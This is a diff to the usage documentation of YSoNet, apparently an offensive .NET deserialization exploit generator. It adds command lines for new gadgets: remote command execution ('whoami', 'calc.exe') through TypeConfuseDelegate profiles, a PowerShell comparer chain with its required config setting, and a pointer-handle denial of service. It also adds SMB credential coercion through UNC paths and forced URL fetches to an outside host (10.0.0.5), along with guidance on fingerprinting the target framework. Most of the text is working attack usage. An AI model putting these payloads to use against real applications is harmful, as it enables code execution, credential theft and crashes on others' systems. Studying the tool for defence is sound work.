@@ -255,8 +255,8 @@ let you pick an inner gadget (`ViewState`, `Resx`, `SharePoint`, `Altserializati
 
 ### `WSManPluginInstance`
 
-The catalog's denial-of-service gadget. It takes no `-c` at all: the whole payload is a
-type name.
+One of the catalog's two denial-of-service gadgets. It takes no `-c` at all: the whole
+payload is a type name.
 
 ```bash
 ./ysonet.exe -g WSManPluginInstance -f Json.NET --i-understand-dos
@@ -304,6 +304,55 @@ collection, and the child is the one that dies:
 That really does kill a process on your machine, so keep it for a host you are happy to
 experiment on.
 
+### `HashPEFileHandle`
+
+The other denial-of-service gadget, and a much narrower one: it only reaches a **CLR v2**
+target (.NET 2.0 / 3.0 / 3.5). There, `System.Security.Policy.Hash`'s deserialization
+constructor takes the `PEFile` member as a native PE-file handle and adopts it. .NET 4
+removed that branch, so a modern target simply does not have the code.
+
+`-c` is an address, as hex or decimal, signed or unsigned. It is parsed, never validated:
+a pointer is a bit pattern, not a magnitude, and which address is interesting is a
+property of the target, not of YSoNet.
+
+```bash
+./ysonet.exe -g HashPEFileHandle -f BinaryFormatter -c 0x41414141 --i-understand-dos
+```
+
+Three things to plan around:
+
+- **What is and is not claimed.** Handing native code a handle it did not create may crash
+  or corrupt the target when that handle is later consumed or released. No code execution
+  and no memory read or write is proved, and none is claimed.
+- **The effect is not immediate.** Nothing happens at deserialization; it happens whenever
+  the target's native code touches the adopted handle.
+- **`-t` is refused outright.** The isolated self-test child runs the current framework,
+  which does not contain the branch, so a clean result would be a false negative - and an
+  arbitrary pointer has no safe automatic effect test in any case.
+
+Both mscorlib types travel as records with no explicit assembly version, so they bind to
+whatever mscorlib the reader has, which is what lets one payload reach the old runtime.
+
+## Choose a TypeConfuseDelegate profile
+
+The family names use one suffix for the reason an operator would select a different
+profile. Runtime-specific profiles name the exact .NET Framework generation; profiles
+with an external dependency name that product. Workflow and comparer shape remain visible
+here and in `--fullhelp`, but they are implementation details shared by more than one
+profile and therefore are not accumulated in the command name.
+
+| Gadget | Choose it for | Distinguishing graph or requirement |
+|---|---|---|
+| `TypeConfuseDelegate` | .NET Framework 4.5-4.8.1 | Built-in `ComparisonComparer<T>` and an ordered-tree root; three root variants. |
+| `TypeConfuseDelegateNetFx40` | Exactly .NET Framework 4.0 | Built-in Workflow reconstruction of `Array.FunctorComparer<T>`; a genuine 4.0 install is required. |
+| `TypeConfuseDelegateNetFx35` | Exactly .NET Framework 3.5 / CLR 2 | Built-in Workflow reconstruction plus System.Core 3.5; local testing uses the CLR2 host. |
+| `TypeConfuseDelegatePowerShell` | The measured 4.8.1 PowerShell target | PowerShell Utility's equality comparer plus the Workflow type-check application setting. |
+| `TypeConfuseDelegateMono` | Mono | Mono-specific comparer and runtime behavior. |
+| `TypeConfuseDelegateFileOperations` | A direct file operation instead of command execution | The standard 4.5+ TCD primitive with an effect-specific sink. |
+
+The renamed profiles were not previously published, so the old development names are not
+kept as aliases. Each profile appears once in listings and completion.
+
 ## Target the CLR v2 generation (`--legacyfx`)
 
 A payload names the assemblies it needs, and ysonet writes the .NET Framework 4.x
@@ -325,19 +374,19 @@ the identity, which is why many of their payloads already land unchanged.)
 ./ysonet.exe -g TempFileCollection -f SoapFormatter -c "C:\inetpub\wwwroot\robots.txt" --legacyfx
 ```
 
-`TypeConfuseDelegateLegacyWorkflow` is the purpose-built command chain for the CLR-v2
+`TypeConfuseDelegateNetFx35` is the purpose-built command chain for the CLR-v2
 generation. It applies the legacy identities itself, so an explicit `--legacyfx` is
 redundant. In the interactive editor the setting is therefore shown as `on (fixed)` and
 cannot be switched off:
 
 ```bash
-./ysonet.exe -g TypeConfuseDelegateLegacyWorkflow -f BinaryFormatter -c "whoami"
+./ysonet.exe -g TypeConfuseDelegateNetFx35 -f BinaryFormatter -c "whoami"
 
 # Direct SOAP: the external root remains List<object>, not an outer surrogate carrier
-./ysonet.exe -g TypeConfuseDelegateLegacyWorkflow -f SoapFormatter -c "whoami"
+./ysonet.exe -g TypeConfuseDelegateNetFx35 -f SoapFormatter -c "whoami"
 
 # "test locally" automatically selects the shipped CLR2 victim for this gadget
-./ysonet.exe -g TypeConfuseDelegateLegacyWorkflow -f SoapFormatter -c "calc.exe" --test
+./ysonet.exe -g TypeConfuseDelegateNetFx35 -f SoapFormatter -c "calc.exe" --test
 ```
 
 Its raw and minified BinaryFormatter, SoapFormatter and LosFormatter forms are measured
@@ -366,14 +415,65 @@ serialized backing tree is a separate, deeper generic graph; it remains availabl
 BinaryFormatter, LosFormatter and NetDataContractSerializer. All normal TCD variants need
 .NET Framework 4.5 or later: .NET 4.0 has neither `Comparer<T>.Create` nor the serializable
 `ComparisonComparer<T>` that this graph places on the wire. This is a real graph boundary,
-not merely the version the tool was compiled against; use the separate legacy Workflow
-gadget for the CLR-v2 generation. Consequently the normal TCD does not offer `legacyfx`
+not merely the version the tool was compiled against; use the separate `NetFx35` profile
+for the CLR-v2 generation. Consequently the normal TCD does not offer `legacyfx`
 in interactive mode, and a scripted `--legacyfx` is refused rather than producing a payload
 that cannot run on CLR2. The same rule applies to `TypeConfuseDelegateFileOperations` and
 the Mono-specific TCD.
 
-Choosing between the two: `TypeConfuseDelegate` covers .NET Framework 4.5 through 4.8.1, and
-`TypeConfuseDelegateNet40Workflow` is only for a target whose INSTALLED framework is
+### PowerShell equality-comparer profile
+
+`TypeConfuseDelegatePowerShell` is a separate gadget, not `TypeConfuseDelegate`
+variant 4. It carries an `IEqualityComparer<string>` in `Dictionary<string,string>` rather
+than an `IComparer<string>` in one of the ordered-tree containers:
+
+```bash
+./ysonet.exe -g TypeConfuseDelegatePowerShell -f BinaryFormatter -c "whoami"
+./ysonet.exe -g TypeConfuseDelegatePowerShell -f LosFormatter -c "whoami" --minify
+```
+
+The target needs all of the following:
+
+- .NET Framework 4.8.1 (the only runtime currently proved; older versions are unclaimed).
+- `Microsoft.PowerShell.Commands.Utility, Version=3.0.0.0`.
+- This application setting effective before the target deserializes this payload:
+
+  ```xml
+  <add key="microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck"
+       value="true" />
+  ```
+
+The setting is mandatory on current serviced Framework. It can come from application
+config at process startup or from an earlier `ActivitySurrogateDisableTypeCheck` payload
+in the same process. A preceding object in the SAME serialized graph cannot arm it in
+time: Workflow checks it while resolving the comparer.
+
+Local `-t` checks Workflow's effective value. It works when the ysonet application config
+sets the value, or in one interactive session after self-testing
+`ActivitySurrogateDisableTypeCheck` with either variant. Variant 1 verifies its exact
+payload in a safety child (because that graph terminates its host after firing), then
+mirrors the setting into the interactive parent for follow-on local tests; variant 2 sets
+it directly in-process. BinaryFormatter and LosFormatter are the only advertised
+formatters, each proved raw and minified.
+SoapFormatter's stock writer rejects the closed-generic root, and
+NetDataContractSerializer's reader rejects the emitted object-reference record because
+its required `memberDatas` member is missing. No other formatter has a positive effect
+cell.
+
+Normal `-c "command"` input works because ysonet supplies `cmd` and `/c command` as the
+two distinct fields. With `--rawcmd`, supply an executable and an argument string; a
+one-part value is refused. Equal fields are also refused because they collapse to one
+Dictionary key. `--legacyfx` is not supported.
+
+This construction is available only for generic `Dictionary<TKey,TValue>`. It cannot be
+ported as another variant to `Hashtable` or `OrderedDictionary`: those containers consume
+the non-generic equality interface, and the audited Framework/installed assemblies have
+no usable non-generic delegate-backed comparer. The ordinary TCD's SortedSet,
+SortedDictionary, and TreeSet variants use ordering comparers and remain separate graphs.
+
+The standard and 4.0 profiles differ at an exact framework boundary:
+`TypeConfuseDelegate` covers .NET Framework 4.5 through 4.8.1, while
+`TypeConfuseDelegateNetFx40` is only for a target whose INSTALLED framework is
 genuinely .NET Framework 4.0 (4.5+ never installed). This is decided by the installed
 framework, NOT by the app pool or the app's target:
 
@@ -382,16 +482,16 @@ framework, NOT by the app pool or the app's target:
   a "v4.0" pool runs 4.8, so use `TypeConfuseDelegate`.
 - `<httpRuntime targetFramework="4.0"/>` in web.config only sets compatibility quirks; it
   does not restore 4.0's private type shapes. Still `TypeConfuseDelegate`.
-- Use `TypeConfuseDelegateNet40Workflow` only on a real 4.0 install: an old Windows (for
+- Use `TypeConfuseDelegateNetFx40` only on a real 4.0 install: an old Windows (for
   example Server 2008 R2 / Windows 7) that never got the 4.5+ update, or an isolated 4.0 VM.
 - Quick check on the target: if `HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full`
   has a `Release` value, it is 4.5+ (use `TypeConfuseDelegate`); if that value is absent it
   is genuine 4.0. `ysonet.Net40TestHost.exe --probe` reports `shape=netfx40` only on real 4.0.
 
-For a genuine .NET Framework 4.0 target, use the target-specific Workflow form:
+For a genuine .NET Framework 4.0 target, use the target-specific `NetFx40` profile:
 
-    ./ysonet.exe -g TypeConfuseDelegateNet40Workflow -f BinaryFormatter -c "whoami"
-    ./ysonet.exe -g TypeConfuseDelegateNet40Workflow -f SoapFormatter -c "whoami"
+    ./ysonet.exe -g TypeConfuseDelegateNetFx40 -f BinaryFormatter -c "whoami"
+    ./ysonet.exe -g TypeConfuseDelegateNetFx40 -f SoapFormatter -c "whoami"
 
 It reconstructs .NET 4.0's two-field Array.FunctorComparer<string> through
 ObjectSerializedRef, then triggers it from SortedSet<string>. BinaryFormatter,
@@ -410,13 +510,19 @@ then fire one payload with its `--deserialize` mode. The repository's opt-in
 `ysonet.Tests.exe --net40` tier automates this through an isolated VM and a mapped directory;
 see `tools/net40-test-host/README.md` for both the manual steps and the tier setup.
 
-Release archives include `ysonet.Clr2TestHost.exe` and its CLR2-only runtime config. The
-host is a deliberately vulnerable, one-shot local process: it verifies that it is really
-running on CLR `2.0.50727` before opening the generated payload, deserializes once, reports
-the observation, and exits. Windows must have the optional .NET Framework 3.5 feature
-installed. `--testclr2` selects this process explicitly; the interactive "test locally"
-setting and `--test --legacyfx` select it automatically. The shipped host reads only
-BinaryFormatter, LosFormatter, and SoapFormatter payloads.
+Release archives include the backward-compatible `ysonet.Clr2TestHost.exe`, explicit
+`ysonet.Clr2TestHost.x86.exe` and `.x64.exe` variants, and their CLR2-only runtime configs.
+Each host is a
+deliberately vulnerable, one-shot local process: it verifies that it is really running on
+CLR `2.0.50727`, reports its process bitness before opening the generated payload,
+deserializes once, reports the observation, and exits. A gadget can declare exact
+non-framework dependencies for this
+isolated child; each file and full assembly identity is validated before the payload is
+opened, and no staged file replaces a dependency of `ysonet.exe`. Windows must have the
+optional .NET Framework 3.5 feature installed. `--testclr2` selects this process
+explicitly; the interactive "test locally" setting and `--test --legacyfx` select it
+automatically. The shipped host reads only BinaryFormatter, LosFormatter, and
+SoapFormatter payloads.
 
 What it does and does not do:
 
@@ -439,7 +545,7 @@ What it does and does not do:
   inner gadget both rewrite each layer in its own format before the next one wraps it.
 - **`-t` runs the rewritten bytes**, so a self-test tests exactly what you are handed.
   Normal payloads run in ysonet's current CLR4 process. A `--legacyfx` payload, and a
-  CLR2-only gadget such as `TypeConfuseDelegateLegacyWorkflow`, runs in the shipped CLR2
+  CLR2-only gadget such as `TypeConfuseDelegateNetFx35`, runs in the shipped CLR2
   process instead. The child proves `Environment.Version` before it reads the payload.
 - **It refuses rather than guessing.** If your `-c` input itself contains a framework
   assembly identity, the two are indistinguishable in the finished payload, so the run
@@ -773,9 +879,12 @@ alias survives into the returned document.
 
 ### Delete files on the target when the object is disposed or collected
 
-`TempFileCollection` uses `System.CodeDom.Compiler.TempFileCollection`, whose
-cleanup path calls `File.Delete` on every path it was given. `-c` is the first
-path, and `--extrafile` adds more - repeat it once per extra path.
+`TempFileCollection` targets the `[Serializable]`
+`System.CodeDom.Compiler.TempFileCollection` in the .NET Framework's in-box
+`System.dll`. The NuGet `System.CodeDom` copy is not `[Serializable]` and cannot
+deserialize this payload. The in-box type's cleanup path calls `File.Delete` on
+every path it was given. `-c` is the first path, and `--extrafile` adds more -
+repeat it once per extra path.
 
 ```bash
 # one file (a benign, easily recreated file - TempFileCollection DELETES it)
@@ -1422,6 +1531,76 @@ Five things to know:
   that costs nothing, because the whole effect completes inside `GetRealObject`.
 - Variant 1 refuses `--file` and `--dtd-out` instead of ignoring them, so a forgotten
   `--variant 2` is an error rather than a payload that discloses nothing.
+
+### Make the target read a directory tree you name
+
+`BootstrapperBuilder` is the widest of these: twelve serializers reach one string
+setter. `Microsoft.Build.Tasks.Deployment.Bootstrapper.BootstrapperBuilder.Path`
+refreshes the object as soon as it is assigned, which enumerates
+`<your path>\Engine`, walks its subdirectories, and XML-parses every `setup.xml`
+it finds. The assembly ships with the .NET Framework redistributable, so the
+target needs no reference of its own.
+
+```bash
+# a UNC directory: the target opens an SMB session to that host before it reads anything
+./ysonet.exe -g BootstrapperBuilder -f Json.NET -c "\10.0.0.5\share"
+
+# a local directory on the target, on a formatter with no [Serializable] requirement
+./ysonet.exe -g BootstrapperBuilder -f Xaml -c "C:\ProgramData\bootstrapper"
+```
+
+Things to know:
+
+- The SMB session happens whether or not anything is there to read, which is what
+  makes it a credential-coercion primitive against an empty share.
+- A `setup.xml` you leave on the share is parsed with legacy XML defaults, so it is
+  attacker-controlled input to an old parser.
+- BF, Soap, Los and FsPickler are out because the type is not `[Serializable]`, and
+  `XmlSerializer` refuses it in its own constructor over the read-only `Products`
+  collection - a member the payload never mentions.
+- `-t` is accepted and reads the path on your own machine.
+
+### Make the target set a timestamp on a path you name
+
+`FileSystemInfoTimeSetter` writes one of the file or directory timestamps through
+`File`/`Directory.SetXxxTimeUtc`. The write is the point on a local path; on a UNC
+path the OPEN is the point, because it is an outbound SMB session - and unlike the
+`FileSystemInfo` gadget above it needs no MS-DOS short name to get there.
+
+```bash
+# variant 1 is a file, variant 2 a directory
+./ysonet.exe -g FileSystemInfoTimeSetter -f Xaml -c "\10.0.0.5\share\x" --variant 1
+./ysonet.exe -g FileSystemInfoTimeSetter -f Xaml -c "C:\ProgramData" --variant 2 --member lastwrite
+```
+
+### Make the target fetch a URL through a type converter
+
+`XamlTypeConverterFetch` needs no `ObjectDataProvider` and no constructor: one
+ordinary XAML attribute is enough. The parser picks the member's own
+`[TypeConverter]`, hands it your text, and the converter opens it.
+
+```bash
+# variant 1: an image source, whose decode is deferred, so the read completes cleanly
+./ysonet.exe -g XamlTypeConverterFetch -f Xaml -c "http://10.0.0.5/x.png" --variant 1
+
+# variant 2: a cursor, which refuses the bytes AFTER fetching them
+./ysonet.exe -g XamlTypeConverterFetch -f Json.NET -c "http://10.0.0.5/x.cur" --variant 2
+```
+
+`ColorConvertedBitmapExtension` is the three-request version of the same idea. Its
+single constructor argument carries an image URI and two ICC colour-profile URIs,
+and the target fetches all three. Both profile options are REQUIRED and have no
+default: WPF parses the source profile FIRST, and a reply that is not a valid ICC
+profile throws before the other two requests happen.
+
+```bash
+./ysonet.exe -g ColorConvertedBitmapExtension -f Xaml -c "http://10.0.0.5/img.png" \
+  --source-profile "http://10.0.0.5/src.icc" \
+  --destination-profile "http://10.0.0.5/dst.icc"
+```
+
+Remote image and profile loading is documented WPF behaviour for both of these, so
+they are a delivery shape rather than a new bug.
 
 ### Make the target load an assembly from a path you name
 
